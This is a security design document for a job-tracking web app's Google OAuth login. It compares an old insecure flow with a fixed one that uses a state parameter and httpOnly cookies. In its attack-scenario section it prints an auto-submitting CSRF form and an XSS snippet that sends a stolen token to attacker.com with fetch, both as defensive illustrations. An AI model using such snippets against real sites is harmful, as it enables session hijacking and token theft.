# OAuth Security Flow Diagram

This document explains the secure OAuth flow implemented in the Job Tracker application.

---

## 🔄 **Secure OAuth Flow (With State Parameter)**

```
┌─────────────────────────────────────────────────────────────────────────┐
│                         SECURE OAUTH FLOW                                │
└─────────────────────────────────────────────────────────────────────────┘

1. User clicks "Login with Google"
   │
   ├─→ Frontend: http://localhost:3000/login
   │
   └─→ Redirects to: /api/auth/google

2. Backend generates state parameter
   │
   ├─→ state = crypto.randomBytes(32).toString('hex')
   │   Example: "a7f3b9c2d4e5f6..."
   │
   ├─→ Store in session: req.session.oauthState = state
   │
   └─→ Redirect to Google with state:
       https://accounts.google.com/o/oauth2/auth?
         client_id=xxx
         &redirect_uri=http://localhost:5000/api/auth/google/callback
         &response_type=code
         &scope=profile email
         &state=a7f3b9c2d4e5f6...    ← CSRF Protection!

3. User authenticates with Google
   │
   └─→ Google shows OAuth consent screen
       "Job Tracker wants to access your profile"

4. Google redirects back with code + state
   │
   └─→ /api/auth/google/callback?
       code=4/0AX4XfWh...
       &state=a7f3b9c2d4e5f6...    ← Same state returned!

5. Backend validates state parameter
   │
   ├─→ if (receivedState !== storedState) {
   │     return error; ← CSRF Attack Blocked!
   │   }
   │
   └─→ ✅ State matches, proceed

6. Backend exchanges code for user info
   │
   ├─→ Contact Google API with code
   ├─→ Get user profile (email, name, picture)
   └─→ Create/find user in database

7. Backend creates JWT token
   │
   ├─→ token = jwt.sign({ userId }, JWT_SECRET, { expiresIn: '7d' })
   │
   └─→ Set secure cookie:
       res.cookie('auth_token', token, {
         httpOnly: true,      ← JavaScript can't access (XSS protection)
         secure: true,        ← HTTPS only in production
         sameSite: 'lax',     ← CSRF protection
         maxAge: 7 days
       })

8. Redirect to frontend (NO TOKEN IN URL!)
   │
   └─→ Redirect to: http://localhost:3000/auth-success
                                          ^^^^^^^^^^^^^^^^
                                          ✅ No ?token= parameter!

9. Frontend verifies authentication
   │
   ├─→ Call: GET /api/auth/me (withCredentials: true)
   │
   ├─→ Cookie sent automatically by browser
   │
   └─→ ✅ Success, redirect to dashboard

10. Subsequent API calls
    │
    └─→ All requests include cookie automatically
        axios.get('/api/applications', { withCredentials: true })
```

---

## 🔓 **Old Insecure Flow (What We Fixed)**

```
❌ INSECURE FLOW (Before Security Update)

1. User clicks "Login with Google"
   └─→ No state parameter generated ← CSRF Vulnerable!

2. Redirect to Google (no state)
   └─→ https://accounts.google.com/o/oauth2/auth?
       client_id=xxx
       ← Missing state parameter!

3. Google callback
   └─→ /api/auth/google/callback?code=...
       ← No state validation!

4. Backend creates token
   └─→ token = jwt.sign({ userId }, JWT_SECRET, { expiresIn: '30d' })
       ← 30 days too long!

5. Redirect with token IN URL
   └─→ /auth-success?token=eyJhbGciOiJIUzI1NiIs...
                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                      ❌ Visible in browser history!
                      ❌ Visible in server logs!
                      ❌ Sent in Referer headers!

6. Frontend extracts token from URL
   └─→ const token = new URLSearchParams(location.search).get('token');
       localStorage.setItem('token', token);
       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
       ❌ Accessible by JavaScript (XSS vulnerable)!

7. Subsequent API calls
   └─→ headers: { Authorization: `Bearer ${token}` }
       ← Token must be manually attached to every request
```

---

## 🛡️ **Security Comparison**

| Security Feature | Old (Insecure) | New (Secure) |
|------------------|----------------|--------------|
| **CSRF Protection** | ❌ None | ✅ State parameter |
| **Token Storage** | ❌ localStorage | ✅ httpOnly cookie |
| **Token in URL** | ❌ Yes (visible everywhere) | ✅ No |
| **JavaScript Access** | ❌ Yes (XSS vulnerable) | ✅ No (httpOnly) |
| **XSS Protection** | ❌ None | ✅ httpOnly + sameSite |
| **Token Expiry** | ❌ 30 days | ✅ 7 days |
| **Manual Token Handling** | ❌ Yes (error-prone) | ✅ Automatic (browser) |
| **CSRF Cookie Protection** | ❌ None | ✅ sameSite: lax |
| **Browser History** | ❌ Token stored | ✅ Clean URLs |
| **Server Logs** | ❌ Token logged | ✅ No tokens in logs |

---

## 🔍 **Attack Scenarios Prevented**

### **1. CSRF Attack (Cross-Site Request Forgery)**

**Old Flow (Vulnerable):**
```
Attacker's site: evil.com

<form action="http://yourapp.com/api/auth/google/callback" method="GET">
  <input name="code" value="attacker-controlled-code" />
</form>
<script>document.forms[0].submit();</script>

Result: ❌ User logged in as attacker's account!
```

**New Flow (Protected):**
```
Attacker's site tries same attack...

Backend checks:
if (receivedState !== req.session.oauthState) {
  return error;
}

Result: ✅ Attack blocked! No valid state parameter.
```

---

### **2. XSS Attack (Cross-Site Scripting)**

**Old Flow (Vulnerable):**
```javascript
// Malicious script injected somehow
const token = localStorage.getItem('token');
fetch('http://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});

Result: ❌ Token stolen!
```

**New Flow (Protected):**
```javascript
// Same malicious script tries to steal token
const token = localStorage.getItem('token'); // null
// Try to access cookie
const cookies = document.cookie; // "auth_token" not visible (httpOnly)

Result: ✅ Attack blocked! Token not accessible to JavaScript.
```

---

### **3. Token Leakage via Referer Header**

**Old Flow (Vulnerable):**
```
User on: /auth-success?token=eyJhbGciOiJIUzI1NiIs...
User clicks external link to attacker.com

HTTP Request to attacker.com:
Referer: http://yourapp.com/auth-success?token=eyJhbGciOiJIUzI1NiIs...
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
         ❌ Token sent to attacker's server!
```

**New Flow (Protected):**
```
User on: /auth-success (no token in URL)
User clicks external link

HTTP Request:
Referer: http://yourapp.com/auth-success
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
         ✅ No token exposed!
```

---

### **4. Browser History Exposure**

**Old Flow (Vulnerable):**
```
Browser History:
• /auth-success?token=eyJhbGciOiJIUzI1NiIs...
  ❌ Anyone with access to browser history has the token!
  ❌ Token persists in history even after logout!
```

**New Flow (Protected):**
```
Browser History:
• /auth-success
  ✅ No sensitive data in history
```

---

## 🔐 **Cookie Security Features**

### **HttpOnly Cookie**
```javascript
httpOnly: true
```
- **Purpose:** Prevents JavaScript access
- **Protects against:** XSS attacks
- **How:** Cookie only accessible by browser HTTP layer

### **Secure Cookie**
```javascript
secure: process.env.NODE_ENV === 'production'
```
- **Purpose:** Only send over HTTPS
- **Protects against:** Man-in-the-middle attacks
- **How:** Cookie never sent over unencrypted HTTP in production

### **SameSite Cookie**
```javascript
sameSite: 'lax'
```
- **Purpose:** Prevents CSRF attacks
- **Protects against:** Cross-site request forgery
- **How:** Cookie not sent with requests from other sites

**SameSite Options:**
- `strict`: Never sent with cross-site requests (most secure, but can break some flows)
- `lax`: Sent with safe cross-site requests (GET navigation) - **our choice**
- `none`: Sent with all cross-site requests (not secure)

---

## 📊 **State Parameter Flow in Detail**

```
┌──────────────────────────────────────────────────────────────┐
│                  STATE PARAMETER FLOW                         │
└──────────────────────────────────────────────────────────────┘

1. Initial Request
   ┌─────────────┐
   │   Browser   │
   └──────┬──────┘
          │ GET /api/auth/google
          ▼
   ┌─────────────┐
   │   Backend   │
   │             │
   │ state = crypto.randomBytes(32)
   │ session.oauthState = state    ← Stored in session
   │             │
   └──────┬──────┘
          │ Redirect to Google with state
          ▼

2. Google Authentication
   ┌─────────────┐
   │   Google    │
   │   OAuth     │
   └──────┬──────┘
          │ User authenticates
          ▼
          │ Callback with state
          ▼

3. Callback Validation
   ┌─────────────┐
   │   Backend   │
   │             │
   │ receivedState = req.query.state
   │ storedState = req.session.oauthState
   │             │
   │ if (receivedState === storedState) {
   │   ✅ Valid - proceed
   │ } else {
   │   ❌ Attack - reject
   │ }
   │             │
   └─────────────┘
```

---

## 🧪 **Testing Security**

### **Test 1: Verify State Parameter**
```bash
# Watch network requests during login
# Should see state in both directions:
# → To Google: ...&state=abc123...
# ← From Google: ...?state=abc123...
```

### **Test 2: Verify Cookie Security**
```javascript
// In browser console:
console.log(document.cookie);
// Should NOT show auth_token (httpOnly prevents access)
```

### **Test 3: Verify No Token in URL**
```
After login, URL should be:
✅ /auth-success
❌ /auth-success?token=...
```

### **Test 4: Attempt CSRF Attack**
```javascript
// Try to forge a callback request
fetch('/api/auth/google/callback?state=fake&code=fake');
// Should fail with "invalid state" error
```

---

## 📝 **Summary**

The secure OAuth implementation provides:

1. ✅ **CSRF Protection** via state parameter validation
2. ✅ **XSS Protection** via httpOnly cookies
3. ✅ **Clean URLs** with no tokens exposed
4. ✅ **Browser History Protection** - no sensitive data
5. ✅ **Automatic Token Management** by browser
6. ✅ **Shorter Token Lifespan** (7 days instead of 30)
7. ✅ **Additional CSRF Protection** via sameSite cookies

**Result:** Significantly improved security posture that addresses all GCP Project Checkup warnings.

---

**For implementation details, see:**
- [OAUTH_SECURITY_IMPLEMENTATION.md](OAUTH_SECURITY_IMPLEMENTATION.md)
- [GCP_SECURITY_CHECKLIST.md](GCP_SECURITY_CHECKLIST.md)
